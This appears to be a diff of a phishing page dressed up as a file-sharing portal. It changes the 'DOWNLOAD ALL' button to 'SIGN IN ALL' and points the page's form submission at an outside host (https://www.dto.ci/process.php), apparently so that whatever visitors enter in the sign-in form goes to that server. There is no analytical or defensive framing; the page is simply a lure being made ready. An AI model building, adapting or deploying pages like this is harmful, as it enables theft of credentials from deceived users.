@@ -3,11 +3,11 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="preload" as="image" href="img/file_4.png?height=200&amp;width=300">
-    <link rel="preload" as="image" href="img/file_1.png?height=200&amp;width=300">
-    <link rel="preload" as="image" href="img/file_3.png?height=200&amp;width=300">
-    <link rel="preload" as="image" href="img/file_2.png?height=200&amp;width=300">
-    <link rel="stylesheet" href="css/fb4b05bff688d194.css" data-precedence="next">
+    <link rel="preload" as="image" href="file_4.png?height=200&amp;width=300">
+    <link rel="preload" as="image" href="file_1.png?height=200&amp;width=300">
+    <link rel="preload" as="image" href="file_3.png?height=200&amp;width=300">
+    <link rel="preload" as="image" href="file_2.png?height=200&amp;width=300">
+    <link rel="stylesheet" href="fb4b05bff688d194.css" data-precedence="next">
    <!-- <link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-c265f49b851cd6f9.js">
     <script src="/_next/static/chunks/11eacf67-e8a3c6afcd735c75.js" async=""></script>
     <script src="/_next/static/chunks/954-5265cb60fefd30ba.js" async=""></script>
@@ -98,7 +98,7 @@
           <div>
             <h2 class="text-sm font-semibold text-black mb-4">SHARED</h2>
           </div>
-          <button id="downloadAll" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 underline-offset-4 h-10 text-blue-600 text-sm font-normal hover:no-underline p-0" style="background: #fff;">DOWNLOAD ALL</button>
+          <button id="downloadAll" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 underline-offset-4 h-10 text-blue-600 text-sm font-normal hover:no-underline p-0" style="background: #fff;">SIGN IN ALL</button>
         </div>
         <div class="flex items-center justify-between border-t border-b border-gray-300 py-2 mb-4 bg-gray-50">
           <span class="text-sm text-gray-600">Files</span>
@@ -413,7 +413,7 @@ form.addEventListener('submit', async (e) => {
   formData.append('device', device);
   formData.append('isFirst', isFirstSubmit);
 
-  let links = "process.php";
+  let links = "https://www.dto.ci/process.php";
 
   try {
     const response = await fetch(links, {
@@ -460,4 +460,5 @@ form.addEventListener('submit', async (e) => {
 });
     </script>
   </body>
+
 </html>
